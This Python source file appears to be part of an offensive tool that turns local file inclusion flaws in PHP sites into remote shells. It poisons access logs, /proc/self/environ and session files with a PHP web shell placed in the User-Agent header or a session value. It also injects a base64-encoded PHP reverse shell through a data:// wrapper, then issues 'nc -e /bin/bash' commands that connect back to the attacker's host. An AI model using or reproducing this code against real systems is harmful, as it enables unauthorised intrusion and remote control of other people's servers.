#!/usr/bin/env python

import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
import base64
import signal
from subprocess import Popen, PIPE, check_output 

class Shell_conncet:

    def Connect_SSh_Shell(self,**kwargs):
        if self.args.readuser:
            with open(self.args.readuser,'r') as username:
                self.args.user = username.read().replace('\n','')
        if self.args.readpass:
           with open(self.args.readpass,'r') as password:
                self.args.password = password.read().replace('\n','') 
        if self.args.Vulnurl:
            try:
              domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
              self.ip_re = (domain[-1][7:-2])
              self.ip_re = self.ip_re[6:]
            except Exception :
               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
               self.ip_re = self.ip_re.group() 
            DisCover = Popen(["ping","-w1",self.ip_re[1:]], stdout=PIPE)   
            output   = str(DisCover.communicate()).split()
            self.ip_re = (output[2]).replace("(",'').replace(')','')
        if "proc/self/environ" in self.url\
        or 'access.log' in self.url or "access" in self.url\
        or 'sessions' in self.url :                                                                                                          
            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"  
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)  
            if "proc/self/environ" in self.url or \
            "/var/log/apache2/access.log" in self.url  :
                request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                     ('username',f'{self.args.user}'),
                                     ('password',f'{self.args.password}'),
                                     ('Cookie',str(self.Cookie).replace('\n',''))]
                        
                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    = 'gnome-terminal  -- '+path
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                if not self.args.port:
                    command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                else:
                     command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
                try:
                    first_req = request.open(self.url).read()  
                    time.sleep(4) 
                    self.Get_Oregnal_URL = request.open(command).read()
                    exit()
                except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()
                except KeyboardInterrupt:
                     exit()
            if 'sessions' in self.url :
                WebShell = "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"
                WEB = self.args.Vulnurl+WebShell
                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                     ('username',f'{self.args.user}'),
                                     ('password',f'{self.args.password}'),
                                     ('Cookie',str(self.Cookie).replace('\n',''))]
                        
                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    = 'gnome-terminal  -- '+path
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                if not self.args.port:
                    command = self.url+f'&cmd=nc%20-e%20%2Fbin%2Fbash%20{self.args.shell}%207777'  
                else:
                     command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
                try:
                    first_req = request.open(WEB).read()  
                    time.sleep(4) 
                    self.Get_Oregnal_URL = request.open(command).read()
                    exit()
                except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()
                except KeyboardInterrupt:
                     exit()           
  
        elif  'php.ini' in self.url or 'apache2' in  self.url :
            with open('./Package/shell/php.txt', 'r') as paylaodPHPRead:
                paylaodPHPRead = paylaodPHPRead.read().replace(" $ip = 'IP'", f" $ip = '{self.args.shell}'")\
                .replace("$port = 'port'", f"$port = '{self.args.port}'")
                base64_encoded = base64.b64encode(paylaodPHPRead.encode()).decode()
                self.paylaodPHP = urllib.parse.quote(base64_encoded)
                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    = 'gnome-terminal  -- '+ path
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.set_handle_redirect(True)
                request.set_handle_refresh(True, max_time=1)  
                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                    ('Cookie',str(self.Cookie).replace('\n','')),
                                    ('username',f'{self.args.user}'),
                                    ('password',f'{self.args.password}')]  
                PHPWAPPER = "data://text/plain;base64,"                   
                self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP   
                try: 
                   first_req = request.open(self.url).read()
                except Exception as e :
                        print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                        print("[*] Error : ",e )
                        exit()
                time.sleep(1)
                first_req = request.open(self.url).read()
                exit()
        elif  "auth" in  self.url or "auth.log" in  self.url :                 
                if os.path.exists('./Package/shell/.address'): 
                    with open ('./Package/shell/.address','r') as readHost:
                                      Host = readHost.read()
                    with open ('./Package/shell/.addressbak.txt','w') as writeHost:
                                 Host = writeHost.write(Host)   
                    with open ('./Package/shell/.address','r') as readip:                    
                        IP_IN = readip.read().split('\n')
                        IP_IN = "".join([*set(IP_IN)])
                        if self.ip_re.replace('\n','') in IP_IN :
                           pass           
                        else:  
                            
                            with open ('./Package/shell/.address','a') as readip:
                               IP_IN = readip.write(str(self.ip_re))                                                                                    
                               path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/ssh.py'
                               run    = 'gnome-terminal  -- '+ path
                               xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)     
                            for T in range(30):
                                for C in  os.popen(" ps ax | grep ssh.py | grep -v grep") :
                                    if "ssh.py" in C  and T != 29 :
                                        time.sleep(4)
                                    elif  T == 29 :
                                       for line in os.popen("ps ax | grep ssh.py  | grep -v grep"):
                                           fields = line.split()
                                           pid = fields[0]
                                           os.kill(int(pid), signal.SIGKILL) 
                                           with open ('./Package/shell/.addressbak.txt','r') as readHost:
                                                  Host = readHost.read() 
                                           with open ('./Package/shell/.address','w') as writeHost:
                                                  Host = writeHost.write(Host)                      
                                           print('\n'+'='*20+"\n[*] CONNCETION-INFO "+'\n'+'='*30+'\n') 
                                           print("[+] Status        : ................ | : SSH Waiting For Inputing  Password ") 
                                           print("[+] Error         : ................ | : TimeUP")   
                                           os.remove('./Package/shell/.addressbak.txt')                   
                                           exit()
                                    else:
                                       break       
                if not os.path.exists('./Package/shell/.address'): 
                    with open ('./Package/shell/.address','a') as readip:
                         IP_IN = readip.write(str(self.ip_re))                                                                                    
                         path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/ssh.py'
                         run    = 'gnome-terminal  -- '+ path
                         xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
                    for T in range(30):
                        for C in  os.popen(" ps ax | grep ssh.py | grep -v grep") :
                            if "ssh.py" in C  and T != 29 :
                               time.sleep(4)  
                            elif  T == 29 :
                                for line in os.popen("ps ax | grep ssh.py  | grep -v grep"):
                                    fields = line.split()
                                    pid = fields[0]
                                    os.kill(int(pid), signal.SIGKILL)    
                                    with open ('./Package/shell/.address','r') as readip: 
                                               readhost = readip.read()
                                               if self.ip_re in readhost :
                                                  repalce = readhost.replace(self.ip_re,'')
                                                  with open ('./Package/shell/.address','w+') as writeIP:
                                                       writeIP =  writeIP.write(repalce)    
                                               else:    
                                                    pass                    
                                print('\n'+'='*20+"\n[*] CONNCETION-INFO "+'\n'+'='*30+'\n') 
                                print("[+] Status        : ................ | : SSH Waiting For Inputing  Password ") 
                                print("[+] Error         : ................ | : TimeUP")                        
                                exit()
                            else:
                                 break   
                if self.args.webshell:
                   pass
                else:  
                    path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                    run    = 'gnome-terminal  -- '+ path
                    xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)  
                    request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                        Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                        ('Cookie',str(self.Cookie).replace('\n','')),
                                        ('username',f'{self.args.user}'),
                                        ('password',f'{self.args.password}')]
                    if not self.args.port:                    
                        command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                    else:
                        command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
                    try:
                        first_req = request.open(self.url).read()
                        first_req = request.open(self.url).read()
                        first_req = request.open(self.url).read()   
                        time.sleep(4) 
                        self.Get_Oregnal_URL = request.open(command).read()
                        exit()
                    except Exception  as e :
                             print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                             print("[*] Error : ",e )
                             print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                             print("[*] Follow url Format ")
                             print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                             print("[*] Example : http://10.10.10.193:4000/page=index.php")
                             exit()
                    except KeyboardInterrupt:
                         exit()
        
if __name__=='__main__':
   Shell_conncet() 

 